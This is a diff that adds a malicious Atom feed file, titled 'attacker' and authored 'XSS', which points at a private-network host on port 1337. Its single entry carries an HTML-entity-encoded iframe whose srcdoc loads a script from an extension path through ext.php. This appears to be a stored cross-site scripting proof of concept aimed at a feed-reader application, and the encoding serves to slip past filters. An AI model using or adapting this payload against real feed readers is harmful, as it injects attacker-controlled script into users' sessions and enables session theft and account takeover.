@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>attacker</title>
+    <link rel="alternate" type="text/html" href="http://192.168.91.132:1337"/>
+    <author><name>XSS</name></author>
+    <updated>2024-12-16T00:00:00.000000+00:00</updated>
+    <id>attacker</id>
+    <entry xml:lang="en">
+        <author><name>XSS</name></author>
+        <title>XSS</title>
+        <published>2024-10-16T00:00:00.000000+00:00</published>
+        <link rel="alternate" type="text/html" href="http://192.168.91.132:1337"/>
+        <id>XSS</id>
+        <content type="html" xml:base="http://192.168.91.132:1337">
+            &#60;iframe srcdoc&#61;&#39;&#60;script src&#61;&#47;ext&#46;php&#63;f&#61;attacker&#37;2Fextensions&#37;2FUserJS&#37;2Fscript&#46;js&#38;t&#61;js&#38;242434&#62;&#60;&#47;script&#62;&#39;&#62;&#60;&#47;iframe&#62;
+        </content>
+    </entry>
+</feed>
